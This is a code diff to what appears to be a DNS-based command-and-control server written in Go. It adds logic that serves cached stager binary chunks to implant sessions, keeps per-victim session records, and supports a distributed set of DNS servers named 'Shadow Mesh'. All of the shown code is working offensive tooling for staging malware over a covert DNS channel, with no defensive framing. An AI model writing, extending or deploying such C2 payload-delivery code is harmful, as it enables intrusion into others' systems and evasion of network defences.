@@ -2225,7 +2225,43 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 			logf("[Stager] Chunk request: index=%d, session=%s, ip=%s", chunkIndex, sessionID, stagerIP)
 		}
 
-		// Get session info
+		// For stager sessions (stg_* prefix), just serve from cache if available
+		// This supports Shadow Mesh where different DNS servers handle different requests
+		if strings.HasPrefix(sessionID, "stg_") {
+			clientBinaryID, totalChunks, hasCached := c2.db.GetCachedBinaryInfo()
+			if hasCached && totalChunks > 0 {
+				chunk, found := c2.db.GetCachedStagerChunk(clientBinaryID, chunkIndex)
+				if found {
+					// Create/update session for tracking
+					c2.mutex.Lock()
+					session, exists := c2.stagerSessions[stagerIP]
+					if !exists || session.SessionID != sessionID {
+						session = &StagerSession{
+							ClientIP:       stagerIP,
+							SessionID:      sessionID,
+							ClientBinaryID: clientBinaryID,
+							OS:             "unknown",
+							Arch:           "unknown",
+							TotalChunks:    totalChunks,
+							DeliveredCount: 0,
+							StartedAt:      time.Now(),
+							LastActivity:   time.Now(),
+						}
+						c2.stagerSessions[stagerIP] = session
+					}
+					session.LastActivity = time.Now()
+					session.DeliveredCount = chunkIndex + 1
+					session.LastChunkDelivered = chunkIndex
+					c2.mutex.Unlock()
+
+					c2.logStagerProgress(session, chunkIndex, clientIP)
+					return fmt.Sprintf("CHUNK|%s", chunk), true
+				}
+			}
+			// No cache - fall through to Master
+		}
+
+		// Get session info for non-stager or cache miss
 		c2.mutex.RLock()
 		session, exists := c2.stagerSessions[stagerIP]
 		c2.mutex.RUnlock()
